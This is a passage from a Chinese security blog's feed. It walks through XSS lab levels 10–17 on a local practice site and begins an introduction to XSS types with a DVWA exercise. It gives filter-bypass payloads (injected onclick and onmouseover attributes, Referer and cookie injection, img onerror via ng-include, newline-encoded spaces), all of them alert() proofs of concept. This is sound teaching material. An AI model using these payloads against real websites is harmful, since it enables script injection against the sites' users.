&lt;p&gt;我们发现 t_sort 可以被我们控制，那么就有一句话探测：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;t_sort=&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert() onclick oonnclick href&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018231258683.png&#34; alt=&#34;image-20221018231258683&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们发现过滤了尖括号，那么 &lt;code&gt;标签绕过法&lt;/code&gt; 都没有用了，那我们可以尝试 &lt;code&gt;事件法&lt;/code&gt;  —— &lt;code&gt;onclick&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;t_sort=&amp;quot; onclick=&amp;quot;alert()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level10.php?t_sort=&amp;quot; onclick=&amp;quot;alert()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着，使用 &lt;code&gt;firebug&lt;/code&gt;  把 &lt;code&gt;hidden&lt;/code&gt;  属性删掉&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018231746353.png&#34; alt=&#34;image-20221018231746353&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击显示出来的输入框，触发 &lt;code&gt;onclick&lt;/code&gt;  事件，成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018231812669.png&#34; alt=&#34;image-20221018231812669&#34;&gt;&lt;/p&gt;
&lt;p&gt;还有一种解法就是，复写 type 属性&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;t_sort=&amp;quot; onclick=&amp;quot;alert()&amp;quot; type=&amp;quot;abc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018232455601.png&#34; alt=&#34;image-20221018232455601&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018232546685.png&#34; alt=&#34;image-20221018232546685&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现可以直接令后面的 &lt;code&gt;type=&amp;quot;hidden&amp;quot;&lt;/code&gt;  失效，也是一种妙招。&lt;/p&gt;
&lt;h2 id=&#34;http头部xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http头部xss&#34;&gt;#&lt;/a&gt; HTTP 头部 XSS&lt;/h2&gt;
&lt;p&gt;来看第 11 关，查看前台源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018232940761.png&#34; alt=&#34;image-20221018232940761&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现和上一关的 &lt;code&gt;url&lt;/code&gt;  有关，我们猜想这应该就是 &lt;code&gt;HTTP&lt;/code&gt;  请求的 &lt;code&gt;Referer&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打开 BP 从第 10 关成功后抓包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018233046231.png&#34; alt=&#34;image-20221018233046231&#34;&gt;&lt;/p&gt;
&lt;p&gt;送入 Repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018233250214.png&#34; alt=&#34;image-20221018233250214&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 &lt;code&gt;value&lt;/code&gt;  的值可以被我们通过操纵 &lt;code&gt;Referer&lt;/code&gt;  控制&lt;/p&gt;
&lt;p&gt;那么就有：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018233433214.png&#34; alt=&#34;image-20221018233433214&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尖括号被过滤&lt;/strong&gt;，那么我们尝试 &lt;code&gt;onclick&lt;/code&gt; ，并且令后面的隐藏 type 失效&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onclick=&amp;quot;alert()&amp;quot; type=&amp;quot;xxx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018233637999.png&#34; alt=&#34;image-20221018233637999&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018233745758.png&#34; alt=&#34;image-20221018233745758&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样地，来到第 12 关，查看源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234102814.png&#34; alt=&#34;image-20221018234102814&#34;&gt;&lt;/p&gt;
&lt;p&gt;抓包看看是哪个字段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234021464.png&#34; alt=&#34;image-20221018234021464&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样原理，构造 onclick 事件：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onclick=&amp;quot;alert()&amp;quot; type=&amp;quot;xxx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234212386.png&#34; alt=&#34;image-20221018234212386&#34;&gt;&lt;/p&gt;
&lt;p&gt;来到第 13 关，查看源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234330771.png&#34; alt=&#34;image-20221018234330771&#34;&gt;&lt;/p&gt;
&lt;p&gt;多了个 t_cook 字段，那么我们请求之：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level13.php?t_cook=t_cook&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234524828.png&#34; alt=&#34;image-20221018234524828&#34;&gt;&lt;/p&gt;
&lt;p&gt;抓包，送入 &lt;code&gt;repeater&lt;/code&gt; ，发现通过修改 &lt;code&gt;Cookie&lt;/code&gt;  的 &lt;code&gt;user=xxx&lt;/code&gt;  内容就可以控制 &lt;code&gt;value&lt;/code&gt;  字段&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234626124.png&#34; alt=&#34;image-20221018234626124&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么就有：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onclick=&amp;quot;alert()&amp;quot; type=&amp;quot;xxx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018234810825.png&#34; alt=&#34;image-20221018234810825&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;angularjs绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#angularjs绕过&#34;&gt;#&lt;/a&gt; AngularJS 绕过&lt;/h2&gt;
&lt;p&gt;第 15 关，查看源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018235801293.png&#34; alt=&#34;image-20221018235801293&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现头部加载了一个 &lt;code&gt;angular.min.js&lt;/code&gt; ，之后使用了 &lt;code&gt;ng-include&lt;/code&gt;  来导入了子节点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019000014552.png&#34; alt=&#34;image-20221019000014552&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ng-include&lt;/strong&gt; 指令用于包含外部的 HTML 文件。&lt;/p&gt;
&lt;p&gt;包含的内容将作为指定元素的子节点。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ng-include&lt;/code&gt;  属性的值可以是一个表达式，返回一个文件名。&lt;/p&gt;
&lt;p&gt;默认情况下，包含的文件需要包含在同一个域名下。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：需要使用 &lt;code&gt;单引号&lt;/code&gt; 包裹你想要导入的 &lt;code&gt;文件&lt;/code&gt;  + &lt;code&gt;参数&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如何使用呢？如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level15.php?src=1.gif&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019000219191.png&#34; alt=&#34;image-20221019000219191&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们思考，这个页面可以包含另一个页面进来，我们何不考虑把第一题的页面导入进来，然后给它构造参数 XSS&lt;/p&gt;
&lt;p&gt;这里尝试过单纯地使用 script 标签没用，所以尝试一种新的事件 —— &lt;code&gt;img&lt;/code&gt;  标签配合 &lt;code&gt;onerror&lt;/code&gt;  事件&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level15.php?src=&amp;#x27;level1.php?name=&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onerror&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019000838111.png&#34; alt=&#34;image-20221019000838111&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用html语法特性绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用html语法特性绕过&#34;&gt;#&lt;/a&gt; 利用 HTML 语法特性绕过&lt;/h2&gt;
&lt;p&gt;第 16 关，我们尝试输入一句话探测&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert() href img onclick onerror oonn&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019001400458.png&#34; alt=&#34;image-20221019001400458&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现只有 &lt;code&gt;script&lt;/code&gt;  标签被过滤&lt;/p&gt;
&lt;p&gt;查看源码发现是被替换成 &lt;code&gt;&amp;amp;nbsp;&lt;/code&gt;  空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019001457527.png&#34; alt=&#34;image-20221019001457527&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是我们还发现，除了替换标签中的 &lt;code&gt;script&lt;/code&gt;  之外，还把我们输入中的 &lt;code&gt;空格&lt;/code&gt; 全都替换成了 &lt;code&gt;HTML编码的空格&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;我们不想让标签语句中的空格被替换，那由于 HTML 语法特性，它只 &lt;code&gt;匹配前后&lt;/code&gt; 的两个 &lt;code&gt;尖括号&lt;/code&gt; ，&lt;strong&gt;中间的语句之间 “隔好几个空格” 或者 “换行” 都无所谓&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;通过上述实验发现 img 没有过滤，可以用来做标签，那么把语句中的 &lt;code&gt;空格&lt;/code&gt; 全部替换为 &lt;code&gt;%0a换行&lt;/code&gt; 或 &lt;code&gt;%0d换行&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img%0asrc=1%0aonerror=&amp;quot;alert()&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019002059825.png&#34; alt=&#34;image-20221019002059825&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;可控变量绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可控变量绕过&#34;&gt;#&lt;/a&gt; 可控变量绕过&lt;/h2&gt;
&lt;p&gt;第 17 关，发现 a 和 b 是疑似可控的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019002528450.png&#34; alt=&#34;image-20221019002528450&#34;&gt;&lt;/p&gt;
&lt;p&gt;变换其值：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019002612767.png&#34; alt=&#34;image-20221019002612767&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们就可以构造事件，这回换一个使用 &lt;code&gt;onmouseover&lt;/code&gt;  事件 (鼠标移动到其上面就触发)&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level17.php?arg01=aa&amp;amp;arg02=bbb onmouseover=alert()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221019002755768.png&#34; alt=&#34;image-20221019002755768&#34;&gt;&lt;/p&gt;
&lt;p&gt;第 18 关与其同理，不做演示。&lt;/p&gt;
</content>
        <category term="XSS跨站脚本攻击探究" />
        <updated>2022-10-20T15:36:10.000Z</updated>
    </entry>
    <entry>
        <id>https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/</id>
        <title>XSS介绍</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/"/>
        <content type="html">&lt;h1 id=&#34;xss跨站脚本介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss跨站脚本介绍&#34;&gt;#&lt;/a&gt; XSS 跨站脚本介绍&lt;/h1&gt;
&lt;p&gt;跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对&lt;strong&gt;用户输入过滤不足&lt;/strong&gt;，输入可以显示在页面上对其他用户（普通用户、第三方用户、网站拥有者）造成影响的 &lt;code&gt;HTML+Js&lt;/code&gt;  代码，从而&lt;strong&gt;盗取用户资料&lt;/strong&gt;、&lt;strong&gt;利用用户身份进行某种动作&lt;/strong&gt;或者&lt;strong&gt;对访问者进行病毒侵害&lt;/strong&gt;的一种攻击方式。&lt;/p&gt;
&lt;p&gt;为了与层叠样式表（Cascading Style Sheets）的缩写 CSS 区分开，跨站脚本攻击通常简写为 &lt;code&gt;XSS&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004202321913.png&#34; alt=&#34;image-20221004202321913&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
&lt;p&gt;发射型就是将应用程序的运行结果或错误返回到页面上显示。典型的反射型 XSS 是在搜索框里体现。&lt;/p&gt;
&lt;h2 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h2&gt;
&lt;p&gt;存储在服务器、数据库（后台）上，能稳定持久执行的跨站脚本。&lt;/p&gt;
&lt;h2 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h2&gt;
&lt;p&gt;能够构成 HTML 的 DOM 树的一部分，或者能够影响 DOM 结构的跨站脚本。&lt;/p&gt;
&lt;h1 id=&#34;xss攻击方式与样例&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss攻击方式与样例&#34;&gt;#&lt;/a&gt; XSS 攻击方式与样例&lt;/h1&gt;
&lt;h2 id=&#34;xss盗用用户信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss盗用用户信息&#34;&gt;#&lt;/a&gt; XSS 盗用用户信息&lt;/h2&gt;
&lt;h2 id=&#34;xss盗取cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss盗取cookie&#34;&gt;#&lt;/a&gt; XSS 盗取 Cookie&lt;/h2&gt;
&lt;h2 id=&#34;xss钓鱼攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss钓鱼攻击&#34;&gt;#&lt;/a&gt; XSS 钓鱼攻击&lt;/h2&gt;
&lt;p&gt;链接上含有攻击代码&lt;/p&gt;
&lt;h2 id=&#34;xss蠕虫攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss蠕虫攻击&#34;&gt;#&lt;/a&gt; XSS 蠕虫攻击&lt;/h2&gt;
&lt;p&gt;XSS 蠕虫的破坏力和影响力都是巨大的。XSS 蠕虫主要发生在用户之间存在交互行为的页面中，当 Web 引用程序对用户输入的数据信息没有做严格的过滤时，通过结合用户的登录状态、API 调用、 &lt;code&gt;Ajax的异步提交&lt;/code&gt; ，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现了代码的感染和传播，也就形成了 XSS 蠕虫。&lt;/p&gt;
&lt;p&gt;MySpace 的 Samy XSS 蠕虫攻击事件是出现最早、最出名的 XSS 蠕虫攻击事件。&lt;/p&gt;
&lt;h1 id=&#34;通过实验深入了解xss三个分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过实验深入了解xss三个分类&#34;&gt;#&lt;/a&gt; 通过实验深入了解 XSS 三个分类&lt;/h1&gt;
&lt;p&gt;首先我们安装 DVWA，使用账号：admin，密码：password 进行登录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：如果登录不上去，就访问 &lt;code&gt;127.0.0.1/dvwa/setup.php&lt;/code&gt; ，点击最下方的 &lt;code&gt;Create/Reset&lt;/code&gt;  按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004210441095.png&#34; alt=&#34;image-20221004210441095&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置 DVWA Security【从最低难度 low 开始吧】，点击 &lt;code&gt;submit&lt;/code&gt;  等待刷新设置完成&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004210537809.png&#34; alt=&#34;image-20221004210537809&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom型xss-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss-2&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004210944194.png&#34; alt=&#34;image-20221004210944194&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们看到下拉框，就要想一想，这个下拉框是从哪里来的。&lt;/p&gt;
&lt;p&gt;我们可以 F12 刷新，看一下 XHR 请求【Ajax】&lt;/p&gt;
&lt;p&gt;这里讲一下 &lt;code&gt;XHR&lt;/code&gt;  和 &lt;code&gt;AJax&lt;/code&gt;  的关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;  （简称 &lt;code&gt;XHR&lt;/code&gt; ）对象用于和服务器交换数据，是基于 &lt;code&gt;XML&lt;/code&gt;  的 &lt;code&gt;HTTP&lt;/code&gt;  请求。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;  是一个浏览器接口，使得 &lt;code&gt;Javascript&lt;/code&gt;  可以进行 &lt;code&gt;HTTP(S)&lt;/code&gt;  通信。&lt;/li&gt;
&lt;li&gt;自从浏览器提供有了 &lt;code&gt;XMLHTTPRequest&lt;/code&gt;  这个接口之后，Ajax 操作就此诞生。&lt;/li&gt;
&lt;li&gt;我们再来说说什么是 &lt;code&gt;Ajax&lt;/code&gt; ， &lt;code&gt;Ajax&lt;/code&gt;  即  &lt;code&gt;Asynchronous JavaScript and XML&lt;/code&gt; ，翻译为： &lt;code&gt;异步&lt;/code&gt; 的  &lt;code&gt;JavaScript &lt;/code&gt; 和 &lt;code&gt; XML&lt;/code&gt; 。【&lt;strong&gt;重点！！&lt;/strong&gt;】&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;  就是基于浏览器提供的 &lt;code&gt;XMLHttpRequest&lt;/code&gt;  对象来实现的。【&lt;strong&gt;重点！！&lt;/strong&gt;】&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;传统的网页（不使用 Ajax）如果需要更新内容，必需重载整个网页面。&lt;/p&gt;
&lt;p&gt;自从有了 Ajax 之后，我们就可以实现&lt;strong&gt;异步地加载网页&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;什么叫异步？&lt;/p&gt;
&lt;p&gt;异步，异嘛，不同的意思，这里也就是指 &lt;code&gt;不跟&lt;/code&gt; 浏览器加载执行网页代码的 &lt;code&gt;步伐&lt;/code&gt; 一致，也就是说在一个网页中 &lt;code&gt;需要用户操作来触发执行代码&lt;/code&gt; ，而不是整个网页代码 &lt;code&gt;一次性执行完毕&lt;/code&gt;  (这里的用户操作是指在同一个网页下面请求代码执行渲染，而不是让浏览器直接跳转渲染另一个页面)。&lt;/p&gt;
&lt;p&gt;Ajax 指的是异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。所以，XMLHttpRequest 对象如果要用于 Ajax 的话，其 open () 方法的 async 参数必须设置为 true。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;xmlhttp.&lt;span class=&#34;title function_ invoke__&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;ajax_test.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004211458850.png&#34; alt=&#34;image-20221004211458850&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以表明，这个页面&lt;strong&gt;没有单独去请求一个功能链接&lt;/strong&gt;来返回下拉链表内容。&lt;/p&gt;
&lt;p&gt;因此，我们直接去看源代码，鼠标右键，查看源代码【XSS 攻击是基于前台源码的攻击】。&lt;/p&gt;
&lt;p&gt;搜索关键字符：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004213743525.png&#34; alt=&#34;image-20221004213743525&#34;&gt;&lt;/p&gt;
&lt;p&gt;对于 HTML 的标签基本定义如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;标签常用于组合块级元素，以便通过 CSS 来对这些元素进行格式化。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签用于定义一个段落。 段落和段落之间有空隙。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签用于创建供用户输入的 HTML 表单。表单用于向服务端发送数据。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt; 元素包含一个或多个如下的表单元素：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt;&amp;gt;&lt;/span&gt; 有输入框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;textarea&lt;/span&gt;&amp;gt;&lt;/span&gt;  标签定义多行的文本输入控件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt; 提交按钮&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;select&lt;/span&gt;&amp;gt;&lt;/span&gt; 有下拉菜单属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt; 单选框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;optgroup&lt;/span&gt;&amp;gt;&lt;/span&gt; 复选框&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;fieldset&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签将表单内容的一部分打包，生成一组相关表单的字段。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span 